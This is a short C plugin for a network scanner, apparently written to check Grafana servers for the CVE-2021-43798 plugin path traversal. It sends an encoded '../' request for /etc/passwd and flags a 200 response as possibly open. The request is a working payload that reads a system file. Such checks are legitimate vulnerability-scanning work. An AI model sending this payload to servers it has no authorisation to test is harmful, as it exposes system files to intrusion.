/* grafana-check-cve2021-43798-4 - Grafana plugin path traversal (CVE-2021-43798)
 * Use only on networks you own or have permission to scan.
 */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_get(ctx, "/public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "grafana-check-cve2021-43798-4: no HTTP response on port %d", ctx->port);
        return 0;
    }
    ar_out(ctx, "grafana-check-cve2021-43798-4: GET /public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd [%d]%s", ar_http_status(resp),
           (ar_http_status(resp) == 200) ? " (open; verify)" : "");
    return 0;
}
